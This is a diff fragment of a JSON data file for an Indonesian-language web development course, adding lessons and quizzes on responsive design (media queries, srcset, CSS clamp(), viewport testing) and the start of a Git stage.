+              "Mayoritas lalu lintas web global (55-60%+) berasal dari perangkat seluler, dan Google memprioritaskan Mobile-First Indexing dalam peringkat pencarian.",
+              "Karena pengguna smartphone tidak pernah membeli produk online.",
+              "Karena perangkat mobile akan memblokir website desktop secara otomatis.",
+              "Karena browser desktop sudah tidak diperbarui lagi."
+            ],
+            "correctIndex": 0,
+            "explanation": "Trafik mobile mendominasi penggunaan web global dan sistem Google Mobile-First Indexing menilai kualitas SEO website berdasarkan versi selulernya."
+          }
+        ]
+      },
+      {
+        "id": "lesson-5-2",
+        "stageId": "stage-5",
+        "slug": "css-media-queries-dan-breakpoints",
+        "title": "CSS Media Queries & Breakpoints Standar",
+        "titleEn": "CSS Media Queries & Standard Breakpoints",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menulis aturan @media (min-width), memahami titik henti (breakpoints standar: sm 640px, md 768px, lg 1024px, xl 1280px), dan content-driven breakpoints.",
+        "prerequisites": [
+          "filosofi-mobile-first-vs-desktop-first"
+        ],
+        "learningObjectives": [
+          "Menulis sintaks CSS Media Query `@media (min-width: ...)` dengan benar.",
+          "Menerapkan standar breakpoints industri (sm: 640px, md: 768px, lg: 1024px, xl: 1280px).",
+          "Menjelaskan konsep Content-Driven Breakpoints (menentukan breakpoint berdasarkan kerapatan konten, bukan merek gadget tertentu)."
+        ],
+        "whyMatters": "Media Queries adalah jembatan teknis yang memungkinkan satu halaman web yang sama tampil sempurna di jam tangan pintar, ponsel, tablet, hingga TV 4K.",
+        "careerContext": "Standar breakpoint Tailwind CSS yang menjadi standar industri global berpijak pada nilai-nilai breakpoint ini.",
+        "commonMistakes": [
+          "Membuat breakpoint spesifik untuk satu merek HP (misal: iPhone 14) alih-alih menggunakan rentang breakpoint umum.",
+          "Mencampuradukkan `min-width` dan `max-width` tanpa urutan cascading yang jelas sehingga saling menimpa secara acak."
+        ],
+        "keyTerms": [
+          {
+            "term": "Media Query",
+            "definition": "Fitur CSS yang menerapkan blok aturan gaya hanya jika kondisi perangkat (seperti lebar layar) terpenuhi."
+          },
+          {
+            "term": "Breakpoint",
+            "definition": "Titik batas ukuran lebar layar (dalam pixel) di mana tata letak antarmuka berubah menyesuaikan ruang."
+          },
+          {
+            "term": "min-width",
+            "definition": "Kondisi media query: 'berlaku mulai dari lebar sekian piksel ke atas'."
+          }
+        ],
+        "contentMd": "# CSS Media Queries & Breakpoints Standar\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari sintaks **CSS Media Queries (`@media`)**, standar **Breakpoints industri**, serta cara mengubah tata letak secara bertahap seiring membesarnya layar perangkat.\n\n## Mengapa Konsep Ini Penting?\nBagaimana cara mengubah menu hamburger di smartphone menjadi deretan menu horizontal di laptop? Atau mengubah susunan 1 kolom kartu di HP menjadi 3 kolom di desktop? Media Queries adalah alat yang memungkinkan transformasi responsif tersebut.\n\n## 1. Sintaks Media Query Mobile-First (`min-width`)\nSintaks dasar `min-width` berarti: *\"Terapkan aturan gaya di dalam kurung kurawal ini HANYA jika lebar layar perangkat **minimal** sekian piksel ke atas\"*:\n\n```css\n/* 1. Gaya Dasar (Default untuk Smartphone < 640px) */\n.kartu-grid {\n  display: grid;\n  grid-template-columns: 1fr; /* 1 kolom penuh di HP */\n  gap: 16px;\n}\n\n/* 2. Tablet Portrait (Mulai 640px ke atas) */\n@media (min-width: 640px) {\n  .kartu-grid {\n    grid-template-columns: repeat(2, 1fr); /* Berubah jadi 2 kolom */\n  }\n}\n\n/* 3. Laptop / Desktop (Mulai 1024px ke atas) */\n@media (min-width: 1024px) {\n  .kartu-grid {\n    grid-template-columns: repeat(4, 1fr); /* Berubah jadi 4 kolom */\n  }\n}\n```\n\n## 2. Breakpoints Standar Industri (Standar Tailwind CSS)\nJangan membuat breakpoint acak untuk setiap merek HP. Gunakan standar konsensus industri:\n\n| Nama Breakpoint | Nilai `min-width` | Target Perangkat Tipikal |\n| :---: | :---: | :--- |\n| **Default** | `< 640px` | Smartphone (Layar Vertikal / Portrait) |\n| **`sm`** | **`640px`** | Smartphone Layar Lebar / Ponsel Lipat |\n| **`md`** | **`768px`** | Tablet (iPad / Tablet Portrait) |\n| **`lg`** | **`1024px`** | Laptop & Tablet Horizontal (Landscape) |\n| **`xl`** | **`1280px`** | Komputer Desktop Standar |\n| **`2xl`** | **`1536px`** | Monitor Lebar / TV Widescreen |\n\n## 3. Filosofi Content-Driven Breakpoints\nMeskipun ada standar industri di atas, aturan terbaik adalah: **Tambahkan breakpoint saat konten Anda mulai terlihat sesak atau rusak (*content-driven*)**, bukan semata-mata karena ada model HP baru yang dirilis ke pasar.\n\n## Kesalahan Umum Pemula\n- **Menulis urutan `min-width` terbalik**: Menulis `@media (min-width: 1024px)` sebelum `@media (min-width: 640px)`. Karena prinsip cascading, aturan 640px yang ditulis belakangan akan menimpa aturan 1024px. **Selalu tulis dari ukuran terkecil ke terbesar!**\n\n## Praktik Mandiri\n1. Buat kontainer teks artikel.\n2. Atur font-size di mobile sebesar `1rem`, lalu tambahkan media query `@media (min-width: 768px)` untuk memperbesar font-size menjadi `1.125rem` di tablet/desktop.\n\n## Ringkasan\n- Media query **`@media (min-width: ...)`** menerapkan aturan mulai dari lebar layar tertentu ke atas.\n- Standar breakpoint umum: **640px (sm)**, **768px (md)**, **1024px (lg)**, dan **1280px (xl)**.\n- Selalu tulis media query secara berurutan **dari layar terkecil ke layar terbesar**.",
+        "quizzes": [
+          {
+            "id": "q-5-2-1",
+            "question": "Sintaks media query manakah yang merepresentasikan pendekatan Mobile-First yang benar?",
+            "options": [
+              "@media (min-width: 768px) { ... }",
+              "@media (max-width: 768px) { ... }",
+              "@media (device: desktop) { ... }",
+              "@media (screen-only: large) { ... }"
+            ],
+            "correctIndex": 0,
+            "explanation": "min-width menargetkan kondisi layar 'mulai dari lebar sekian piksel ke atas', yang merupakan inti dari pendekatan Mobile-First progresif."
+          },
+          {
+            "id": "q-5-2-2",
+            "question": "Berdasarkan standar industri modern (seperti Tailwind CSS), nilai breakpoint 'md' standar umumnya berada pada ukuran berapa?",
+            "options": [
+              "768px (ukuran umum tablet portrait)",
+              "320px",
+              "1920px",
+              "4800px"
+            ],
+            "correctIndex": 0,
+            "explanation": "Breakpoint md (Medium) standar industri dipatok pada 768px yang mencakup perangkat tablet portrait dan layar lipat."
+          },
+          {
+            "id": "q-5-2-3",
+            "question": "Mengapa penentuan breakpoint sebaiknya didasarkan pada titik saat konten mulai terlihat sesak ('content-driven'), bukan semata-mata pada merek model gadget tertentu?",
+            "options": [
+              "Karena dimensi layar gadget terus berkembang dan bervariasi, sehingga breakpoint berbasis konten memastikan tata letak tetap stabil di perangkat apapun.",
+              "Karena produsen smartphone melarang merek mereka dicantumkan di CSS.",
+              "Karena bahasa CSS tidak dapat mendeteksi resolusi Apple iPhone.",
+              "Agar browser tidak perlu membaca media query."
+            ],
+            "correctIndex": 0,
+            "explanation": "Desain yang tangguh menyesuaikan breakpoint ketika teks atau grid mulai terasa sempit, bukan terikat pada ukuran spesifik satu merek HP."
+          }
+        ]
+      },
+      {
+        "id": "lesson-5-3",
+        "stageId": "stage-5",
+        "slug": "gambar-dan-media-responsif",
+        "title": "Gambar & Media Responsif (srcset, picture element)",
+        "titleEn": "Responsive Images & Media",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Mengoptimalkan gambar responsive dengan max-width 100%, atribut srcset dan sizes, elemen <picture> untuk art direction, dan format modern (WebP/AVIF).",
+        "prerequisites": [
+          "css-media-queries-dan-breakpoints"
+        ],
+        "learningObjectives": [
+          "Menerapkan aturan CSS reset wajib agar gambar tidak meluap: `max-width: 100%; height: auto;`.",
+          "Menyediakan berbagai resolusi gambar menggunakan atribut srcset dan sizes pada tag <img>.",
+          "Menerapkan elemen <picture> untuk Art Direction (cropper foto berbeda di mobile vs desktop).",
+          "Menyediakan format modern (AVIF/WebP) dengan fallback JPG/PNG."
+        ],
+        "whyMatters": "Gambar adalah penyumbang ukuran file terbesar (60-80% byte) pada halaman web. Gambar yang tidak dioptimasi membuat loading mobile sangat lambat dan memboroskan kuota internet pengguna.",
+        "careerContext": "Komponen `next/image` di Next.js mengotomatiskan teknik `srcset` dan format modern ini di balik layar.",
+        "commonMistakes": [
+          "Mengirimkan file foto asli berukuran 4K (5 MB) ke perangkat smartphone yang hanya memiliki lebar layar 375px.",
+          "Lupa menyertakan `height: auto` saat menyetel `max-width: 100%` yang membuat gambar terdistorsi gepeng."
+        ],
+        "keyTerms": [
+          {
+            "term": "srcset",
+            "definition": "Atribut <img> yang menyajikan daftar file gambar dengan berbagai resolusi ukuran lebar (w descriptor)."
+          },
+          {
+            "term": "sizes",
+            "definition": "Atribut penjelas kepada browser berapa lebar perkiraan slot gambar pada berbagai kondisi media query."
+          },
+          {
+            "term": "<picture>",
+            "definition": "Elemen pembungkus untuk Art Direction dan penyajian format gambar generasi baru (AVIF/WebP)."
+          },
+          {
+            "term": "Art Direction",
+            "definition": "Praktik menyajikan komposisi atau cropping gambar yang berbeda antara tampilan mobile (portrait rapat) dan desktop (landscape lebar)."
+          }
+        ],
+        "contentMd": "# Gambar & Media Responsif (srcset, picture element)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara menyajikan media visual secara adaptif dan hemat kuota: mulai dari aturan dasar **`max-width: 100%`**, menyajikan resolusi bertingkat dengan **`srcset` & `sizes`**, hingga teknik **Art Direction** menggunakan elemen **`<picture>`**.\n\n## Mengapa Konsep Ini Penting?\nJika Anda memiliki foto banner beresolusi 4K (ukuran 4 MB), mengunduh foto tersebut di smartphone pengguna dengan sinyal 3G akan memakan waktu 10 detik dan menghabiskan kuota mereka. Gambar harus disajikan dalam ukuran yang pas sesuai resolusi layar perangkat yang meminta.\n\n## 1. Aturan CSS Reset Wajib Gambar Responsif\nSetiap proyek web wajib memiliki aturan ini pada stylesheet globalnya:\n\n```css\nimg, picture, video {\n  max-width: 100%; /* Gambar elastis, tidak boleh melebihi lebar kontainernya */\n  height: auto;     /* Pertahankan rasio aspek asli (tidak gepeng) */\n  display: block;   /* Hilangkan celah ruang kosong bawaan inline */\n}\n```\n\n## 2. Menyajikan Resolusi Fleksibel dengan `srcset` & `sizes`\nAtribut `srcset` memberikan daftar pilihan foto, dan browser akan otomatis mengunduh **hanya 1 foto terkecil yang paling cocok**:\n\n```html\n<img \n  src=\"/banner-800.jpg\"\n  srcset=\"\n    /banner-400.jpg   400w,\n    /banner-800.jpg   800w,\n    /banner-1200.jpg 1200w\n  \"\n  sizes=\"(min-width: 1024px) 1200px, (min-width: 640px) 800px, 100vw\"\n  alt=\"Pemandangan kantor teknologi modern\"\n/>\n```\n- Browser ponsel (lebar 375px) otomatis mengunduh `banner-400.jpg` (hemat kuota).\n- Monitor desktop lebar otomatis mengunduh `banner-1200.jpg` (gambar tajam).\n\n## 3. Art Direction & Format Generasi Baru dengan `<picture>`\nGunakan elemen `<picture>` saat Anda ingin mengganti komposisi gambar (misal: foto dipotong fokus ke wajah di mobile, dan foto panorama lebar di desktop) atau menyediakan format **AVIF / WebP**:\n\n```html\n<picture>\n  <!-- 1. Coba format AVIF paling modern & hemat -->\n  <source srcset=\"/hero.avif\" type=\"image/avif\" />\n  \n  <!-- 2. Coba format WebP jika browser belum dukung AVIF -->\n  <source srcset=\"/hero.webp\" type=\"image/webp\" />\n  \n  <!-- 3. Fallback format standar JPG untuk browser lawas -->\n  <img src=\"/hero.jpg\" alt=\"Ilustrasi coding\" />\n</picture>\n```\n\n## Kesalahan Umum Pemula\n- **Membiarkan gambar overflow**: Tidak menyetel `max-width: 100%` sehingga foto berukuran 2000px memicu scrollbar horizontal rusak di layar smartphone.\n\n## Praktik Mandiri\n1. Buat tag `<img>` dengan aturan CSS `max-width: 100%; height: auto;`.\n2. Masukkan ke dalam kontainer div selebar 300px dan buktikan gambar menyusut rapi mengikuti kontainer.\n\n## Ringkasan\n- Selalu gunakan **`max-width: 100%; height: auto;`** untuk mencegah gambar meluap.\n- Gunakan **`srcset` & `sizes`** agar browser mengunduh ukuran gambar terkecil yang pas.\n- Gunakan **`<picture>`** untuk Art Direction dan penyajian format modern **AVIF/WebP** dengan fallback aman.",
+        "quizzes": [
+          {
+            "id": "q-5-3-1",
+            "question": "Apa fungsi utama dari atribut srcset dan sizes pada tag <img> HTML5?",
+            "options": [
+              "Memberikan daftar variasi resolusi gambar agar browser dapat mengunduh hanya ukuran gambar terkecil yang paling pas sesuai resolusi layar perangkat.",
+              "Mengubah format gambar JPG menjadi animasi GIF secara otomatis.",
+              "Mengatur filter warna hitam putih pada foto.",
+              "Mencegah pengguna menyimpan foto dengan klik kanan."
+            ],
+            "correctIndex": 0,
+            "explanation": "srcset menyajikan variasi resolusi gambar, menghemat kuota dan mempercepat loading pada ponsel dengan menghindari download file gambar besar yang tidak perlu."
+          },
+          {
+            "id": "q-5-3-2",
+            "question": "Kapan Anda sebaiknya menggunakan elemen <picture> dibandingkan tag <img> biasa?",
+            "options": [
+              "Ketika membutuhkan 'Art Direction' (misal cropping foto berbeda antara mobile dan desktop) atau menyajikan format generasi baru seperti AVIF/WebP dengan fallback aman.",
+              "Hanya saat gambar gagal dimuat oleh browser.",
+              "Hanya untuk menampilkan video YouTube.",
+              "Ketika gambar tidak memiliki atribut alt."
+            ],
+            "correctIndex": 0,
+            "explanation": "Elemen <picture> memberi kendali penuh untuk menyajikan format modern (AVIF/WebP) dan cropping foto berbeda berdasarkan media query."
+          },
+          {
+            "id": "q-5-3-3",
+            "question": "Aturan CSS apakah yang WAJIB diberikan pada seluruh elemen media gambar agar gambar tidak meluap (overflow) merusak layout layar smartphone?",
+            "options": [
+              "max-width: 100%; height: auto; display: block;",
+              "width: 100vw; height: 100vh;",
+              "resize: force-fit;",
+              "overflow-image: hidden;"
+            ],
+            "correctIndex": 0,
+            "explanation": "max-width: 100%; height: auto; adalah aturan CSS reset wajib agar gambar tetap elastis mengikuti lebar kontainer tanpa merusak rasio aspek."
+          }
+        ]
+      },
+      {
+        "id": "lesson-5-4",
+        "stageId": "stage-5",
+        "slug": "fluid-typography-dan-css-clamp",
+        "title": "Fluid Typography & CSS clamp()",
+        "titleEn": "Fluid Typography & CSS clamp()",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Menciptakan tipografi dan jarak spasial yang membesar/mengecil secara mulus (fluid) menggunakan fungsi matematika CSS clamp(min, val, max).",
+        "prerequisites": [
+          "gambar-dan-media-responsif"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep Fluid Typography dibandingkan ukuran font yang melompat kaku pada breakpoint.",
+          "Menerapkan fungsi CSS `clamp(min, preferred, max)` pada font-size, padding, dan gap.",
+          "Menghitung nilai viewport width (vw) yang harmonis di dalam parameter clamp."
+        ],
+        "whyMatters": "Menghilangkan kebutuhan menulis puluhan media query manual hanya untuk mengubah ukuran judul di setiap perubahan lebar layar beberapa piksel.",
+        "careerContext": "Teknik fluid modern banyak digunakan dalam desain web mutakhir untuk menjaga keindahan tipografi di layar tablet dan layar ultrawide.",
+        "commonMistakes": [
+          "Hanya menggunakan `font-size: 5vw` murni tanpa batas clamp, sehingga teks menjadi sangat kecil tak terbaca di smartphone dan menjadi raksasa di layar TV.",
+          "Salah urutan parameter clamp (Urutan wajib: `clamp(MIN, PREFERRED, MAX)`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Fluid Typography",
+            "definition": "Teknik tipografi di mana ukuran font berubah secara kontinu dan mulus mengikuti lebar viewport."
+          },
+          {
+            "term": "clamp(min, val, max)",
+            "definition": "Fungsi matematika CSS yang mengunci nilai dinamis dalam rentang batas bawah minimal dan batas atas maksimal."
+          },
+          {
+            "term": "vw (Viewport Width)",
+            "definition": "Satuan ukuran persentase dari lebar jendela layar browser (1vw = 1% lebar layar)."
+          }
+        ],
+        "contentMd": "# Fluid Typography & CSS clamp()\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari teknik **Fluid Typography** menggunakan fungsi modern **`clamp()`**: bagaimana membuat ukuran font judul dan jarak padding membesar dan mengecil secara sangat mulus mengikuti lebar layar tanpa lonjakan kasar.\n\n## Mengapa Konsep Ini Penting?\nCara lama mengubah ukuran font menggunakan media query:\n- Di HP: `font-size: 24px;`\n- Di Tablet: `font-size: 32px;`\n- Di Desktop: `font-size: 48px;`\nCara ini menyebabkan ukuran teks \"melompat mendadak\" saat jendela browser digeser melewati batas breakpoint. Dengan Fluid Typography, teks membesar secara kontinu di setiap piksel perubahan layar.\n\n## Anatomi Fungsi `clamp(MIN, PREFERRED, MAX)`\nFungsi `clamp()` menerima 3 parameter:\n\n```css\n/* clamp(Batas_Minimal, Nilai_Dinamis_Ideal, Batas_Maksimal) */\nh1 {\n  font-size: clamp(2rem, 5vw + 1rem, 4rem);\n}\n```\n\n### Cara Kerja:\n1. **Batas Bawah (`2rem` / 32px)**: Di layar smartphone terkecil, font **tidak akan pernah mengecil lebih kecil dari 2rem**.\n2. **Nilai Dinamis (`5vw + 1rem`)**: Di layar sedang, font akan membesar dan mengecil secara elastis mengikuti 5% lebar layar.\n3. **Batas Atas (`4rem` / 64px)**: Di monitor 4K raksasa, font **tidak akan pernah membesar melebihi 4rem**.\n\n## Penerapan `clamp()` pada Spacing Layout (Padding & Gap)\nFungsi `clamp()` tidak hanya untuk font, tetapi juga sangat brilian untuk padding kontainer halaman:\n\n```css\n.hero-section {\n  /* Padding atas-bawah minimal 40px, ideal 8vw, maksimal 120px */\n  padding-top: clamp(2.5rem, 8vw, 7.5rem);\n  padding-bottom: clamp(2.5rem, 8vw, 7.5rem);\n}\n```\n\n## Kesalahan Umum Pemula\n- **Menggunakan `font-size: 4vw` polos tanpa clamp**: Mengakibatkan teks menjadi sekecil semut di HP 320px dan membesar tak terkontrol sebesar banner jalanan di layar monitor 34 inch.\n- **Tertukar parameter**: Menaruh nilai maksimal di depan nilai minimal.\n\n## Praktik Mandiri\n1. Buat elemen judul `<h1>` dengan properti `font-size: clamp(1.5rem, 4vw, 3rem);`.\n2. Tarik tepi jendela browser Anda secara perlahan dan amati bagaimana teks membesar secara sangat halus tanpa ada patahan.\n\n## Ringkasan\n- **Fluid Typography** membuat ukuran font diskalakan secara kontinu mengikuti lebar layar.\n- Sintaks **`clamp(MIN, PREFERRED, MAX)`** menjaga nilai dinamis tetap aman dalam batas minimal dan maksimal yang nyaman dibaca.\n- `clamp()` dapat diterapkan pada `font-size`, `padding`, `margin`, dan `gap`.",
+        "quizzes": [
+          {
+            "id": "q-5-4-1",
+            "question": "Perhatikan sintaks CSS berikut:\nfont-size: clamp(1.5rem, 3vw + 1rem, 3rem);\nApa arti dari fungsi clamp() tersebut?",
+            "options": [
+              "Ukuran font akan fleksibel mengikuti lebar viewport, namun dibatasi minimal 1.5rem (tidak boleh lebih kecil) dan maksimal 3rem (tidak boleh lebih besar).",
+              "Ukuran font akan otomatis menjadi 3rem di semua layar.",
+              "Font akan berkedip antara 1.5rem dan 3rem setiap 3 detik.",
+              "Teks akan terpotong jika melebihi 3 baris."
+            ],
+            "correctIndex": 0,
+            "explanation": "clamp(MIN, VAL, MAX) mengunci nilai dinamis agar selalu berada dalam rentang batas bawah minimal dan batas atas maksimal yang aman."
+          },
+          {
+            "id": "q-5-4-2",
+            "question": "Apa keuntungan utama menggunakan fluid typography dengan clamp() dibandingkan menulis puluhan media query manual?",
+            "options": [
+              "Ukuran teks membesar dan mengecil secara sangat mulus (fluid) di setiap piksel perubahan layar tanpa lonjakan ukuran yang kasar (jumpy).",
+              "Menghilangkan kebutuhan memilih jenis font keluarga.",
+              "Mengurangi penggunaan memori server backend.",
+              "Membuat teks dapat diterjemahkan ke bahasa asing secara otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Fluid typography menghasilkan skalabilitas tipografi yang halus dan elastis tanpa perlu mendefinisikan tumpukan media query berulang kali."
+          },
+          {
+            "id": "q-5-4-3",
+            "question": "Selain pada properti font-size, pada properti CSS apakah fungsi clamp() sangat efektif diterapkan?",
+            "options": [
+              "padding, margin, gap, dan max-width kontainer layout.",
+              "Hanya pada z-index dan opacity.",
+              "Hanya pada nama font-family.",
+              "clamp() dilarang digunakan selain pada font-size."
+            ],
+            "correctIndex": 0,
+            "explanation": "clamp() dapat diterapkan pada properti dimensi spasial apapun untuk menghasilkan jarak padding kontainer atau margin hero section yang fluid."
+          }
+        ]
+      },
+      {
+        "id": "lesson-5-5",
+        "stageId": "stage-5",
+        "slug": "pengujian-responsivitas-viewport",
+        "title": "Pengujian Responsivitas di Berbagai Viewport",
+        "titleEn": "Responsive Viewport Testing & Debugging",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Melakukan audit dan pengujian layout responsif menggunakan Browser DevTools Device Toolbar, touch targets (a11y), dan mendeteksi bug horizontal scroll.",
+        "prerequisites": [
+          "fluid-typography-dan-css-clamp"
+        ],
+        "learningObjectives": [
+          "Menggunakan fitur Device Mode / Responsive Toolbar pada Chrome DevTools untuk simulasi berbagai dimensi smartphone dan tablet.",
+          "Mendeteksi dan memperbaiki bug umum horizontal overflow (munculnya scrollbar horizontal yang merusak layout mobile).",
+          "Memastikan ukuran touch target tombol minimal 44x44px untuk kenyamanan sentuhan jari."
+        ],
+        "whyMatters": "Pengujian menyeluruh mencegah rilis website yang rusak saat dibuka oleh klien atau pengguna di perangkat smartphone nyata.",
+        "careerContext": "Quality Assurance (QA) dan Frontend Developer selalu melakukan cross-device testing sebelum menyetujui Pull Request rilis ke produksi.",
+        "commonMistakes": [
+          "Hanya menguji website di monitor laptop sendiri tanpa pernah menguji di mode simulasi smartphone.",
+          "Membuat tombol kecil (misal 20x20px) yang sulit ditekan oleh jari pengguna di smartphone (*Fat Finger Issue*)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Device Mode",
+            "definition": "Alat emulator di browser DevTools untuk mensimulasikan berbagai resolusi layar ponsel dan tablet."
+          },
+          {
+            "term": "Horizontal Overflow",
+            "definition": "Bug di mana elemen yang terlalu lebar menyebabkan halaman dapat digeser ke samping menyisakan ruang putih kosong."
+          },
+          {
+            "term": "Touch Target",
+            "definition": "Area fisik tombol atau link yang dapat disentuh oleh jari pengguna (standar minimal 44x44px atau 48x48px)."
+          }
+        ],
+        "contentMd": "# Pengenalan Pengujian Responsivitas di Berbagai Viewport\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara menguji dan mengaudit tampilan website Anda menggunakan **Browser DevTools Device Toolbar**, mengatasi bug klasik **Horizontal Overflow** (halaman geser kanan kosong), serta mematuhi standar ukuran **Touch Target** tombol.\n\n## Mengapa Konsep Ini Penting?\nWebsite yang terlihat sempurna di laptop Anda bisa saja rusak total di smartphone: teks terpotong, tombol terlalu kecil untuk ditekan jari, atau halaman bisa digeser ke kanan menyisakan ruang putih yang mengganggu.\n\n## 1. Menggunakan Chrome DevTools Device Toolbar\n1. Tekan tombol **F12** (atau klik kanan $\\rightarrow$ *Inspect*).\n2. Klik ikon smartphone/tablet (**Toggle Device Toolbar**) di pojok kiri atas jendela DevTools (atau tekan `Ctrl + Shift + M` / `Cmd + Shift + M`).\n3. Pilih preset perangkat (seperti iPhone 14, Samsung Galaxy, iPad) atau pilih mode **Responsive** dan tarik tuas pengubah ukuran secara bebas.\n\n## 2. Mendeteksi & Memperbaiki Bug \"Horizontal Overflow\"\nTanda paling jelas dari bug ini: di smartphone, halaman web bisa digeser ke samping kanan secara tidak sengaja (*horizontal scroll*).\n\n### Penyebab Umum:\n- Elemen dengan lebar tetap yang kaku, misalnya `width: 500px;` di layar HP selebar 375px.\n- Gambar tanpa `max-width: 100%`.\n- Padding yang ditambahkan pada elemen dengan `width: 100%` tanpa aturan `box-sizing: border-box`.\n\n### Cara Cepat Menemukan Elemen yang Meluap:\nJalankan cuplikan ini di Console DevTools untuk memberi garis merah pada elemen yang bocor keluar:\n```js\ndocument.querySelectorAll('*').forEach(el => {\n  if (el.offsetWidth > document.documentElement.offsetWidth) {\n    console.log('Elemen bocor keluar:', el);\n    el.style.outline = '2px solid red';\n  }\n});\n```\n\n## 3. Standar Ukuran Touch Target (Aksesibilitas Sentuhan)\nBerdasarkan pedoman Google dan standar aksesibilitas WCAG:\n- Ukuran fisik tombol atau area sentuh tautan minimal adalah **44px $\\times$ 44px** (atau **48px $\\times$ 48px**).\n- Tombol yang terlalu kecil membuat pengguna kesulitan menekan atau tidak sengaja menekan tombol yang salah di sebelahnya (*Fat Finger Issue*).\n\n```css\n/* Pastikan tombol interaktif memiliki target sentuh nyaman */\n.tombol-mobile {\n  min-height: 48px;\n  min-width: 48px;\n  padding: 12px 20px;\n}\n```\n\n## Kesalahan Umum Pemula\n- **Mematikan pinch-to-zoom**: Mengatur `user-scalable=no` pada meta viewport adalah pelanggaran aksesibilitas berat karena melarang pengguna memperbesar teks.\n\n## Praktik Mandiri\n1. Buka website Anda di Chrome DevTools Device Toolbar.\n2. Geser lebar viewport dari 320px hingga 1200px secara perlahan.\n3. Pastikan tidak ada scrollbar horizontal yang muncul di bagian bawah layar.\n\n## Ringkasan\n- Gunakan **Device Toolbar (Ctrl+Shift+M)** untuk menguji tampilan mobile dan tablet.\n- Cegah **Horizontal Overflow** dengan memastikan tidak ada elemen dengan lebar tetap (*fixed width*) yang melebihi lebar layar.\n- Pastikan area sentuh tombol minimal **44x44px** atau **48x48px** untuk kenyamanan pengguna layar sentuh.",
+        "quizzes": [
+          {
+            "id": "q-5-5-1",
+            "question": "Alat bawaan browser apakah yang paling cepat dan akurat digunakan untuk menguji tampilan website di berbagai dimensi resolusi smartphone dan tablet selama masa pengembangan?",
+            "options": [
+              "Chrome / Firefox DevTools Device Mode (Responsive View).",
+              "Mencetak halaman ke kertas printer.",
+              "Melihat source code HTML di aplikasi Notepad.",
+              "Menjalankan query database SQL."
+            ],
+            "correctIndex": 0,
+            "explanation": "Fitur Device Toolbar pada browser DevTools memungkinkan simulasi dimensi layar, rotasi orientasi, hingga throttling kecepatan koneksi seluler."
+          },
+          {
+            "id": "q-5-5-2",
+            "question": "Ketika menguji website di perangkat smartphone, masalah interaksi apakah yang sering timbul jika target tombol (touch target) terlalu kecil?",
+            "options": [
+              "Masalah 'Fat Finger': Pengguna kesulitan menekan tombol dengan tepat atau tidak sengaja menekan tautan lain di sebelahnya.",
+              "Baterai smartphone akan cepat habis dalam beberapa detik.",
+              "Layar sentuh smartphone akan rusak secara fisik.",
+              "Browser mobile akan mematikan koneksi internet."
+            ],
+            "correctIndex": 0,
+            "explanation": "Pedoman Human Interface Guidelines & WCAG merekomendasikan target sentuh tombol minimal 44x44 atau 48x48 pixel agar nyaman ditekan jari."
+          },
+          {
+            "id": "q-5-5-3",
+            "question": "Apa tanda visual paling umum bahwa sebuah website mengalami bug horizontal overflow pada tampilan mobile?",
+            "options": [
+              "Muncul scrollbar horizontal di bagian bawah layar smartphone dan halaman bisa digeser ke samping kanan menyisakan ruang kosong yang merusak layout.",
+              "Warna teks berubah menjadi hitam putih.",
+              "Gambar berubah menjadi link tautan teks.",
+              "Kecepatan animasi bertambah dua kali lipat."
+            ],
+            "correctIndex": 0,
+            "explanation": "Horizontal overflow terjadi saat ada elemen dengan lebar kaku yang melebihi lebar layar smartphone sehingga memicu scrollbar horizontal yang mengganggu."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-6",
+    "orderIndex": 6,
+    "titleId": "Git & GitHub Collaborative Workflow",
+    "titleEn": "Git & GitHub Collaborative Workflow",
+    "category": "Fundamentals",
+    "description": "Menguasai version control terdistribusi (Git), branching strategy, merge conflict resolution, dan alur kolaborasi tim di GitHub.",
+    "descriptionEn": "Master distributed version control (Git), branching strategies, merge conflict resolution, and GitHub collaboration workflows.",
+    "lessons": [
+      {
+        "id": "lesson-6-1",
+        "stageId": "stage-6",
+        "slug": "dasar-git-init-add-commit-status",
+        "title": "Dasar Git: init, add, commit, status & log",
+        "titleEn": "Git Basics: init, add, commit, status & log",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menginisialisasi repository lokal, memahami siklus hidup file (Working Directory, Staging Area, Repository), git commit, dan .gitignore.",
+        "prerequisites": [
+          "pengujian-responsivitas-viewport"
+        ],
+        "learningObjectives": [
+          "Menjelaskan perbedaan 3 status file dalam arsitektur Git: Working Directory, Staging Area, dan Git Repository.",
+          "Mengeksekusi perintah inisialisasi repo (git init), staging (git add), dan penyimpanan snapshot (git commit).",
+          "Memeriksa status perubahan dengan git status dan menelusuri riwayat dengan git log.",
+          "Mencegah file sensitif atau cache ter-commit menggunakan file .gitignore."
+        ],
+        "whyMatters": "Version control adalah jaring pengaman utama developer yang memungkinkan Anda kembali ke versi kode sebelumnya jika terjadi error fatal.",
+        "careerContext": "Setiap perusahaan software mewajibkan penguasaan Git untuk seluruh tim pengembang tanpa terkecuali.",
+        "commonMistakes": [
+          "Lupa membuat file `.gitignore` sehingga folder `node_modules` atau file kredensial `.env` ikut terunggah ke Git.",
+          "Melakukan commit dengan pesan tidak jelas seperti `git commit -m 'update'` atau `git commit -m 'fix bug'`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Version Control System (VCS)",
+            "definition": "Sistem perangkat lunak yang mencatat riwayat perubahan file dari waktu ke waktu."
+          },
+          {
+            "term": "Working Directory",
+            "definition": "Folder kerja lokal tempat Anda mengedit file secara aktif."
+          },
+          {
+            "term": "Staging Area (Index)",
+            "definition": "Area persiapan tempat Anda memilih file mana saja yang siap dibungkus ke dalam commit berikutnya."
+          },
+          {
+            "term": "Commit",
+            "definition": "Snapshot permanen dari riwayat perubahan kode pada titik waktu tertentu."
+          },
+          {
+            "term": ".gitignore",
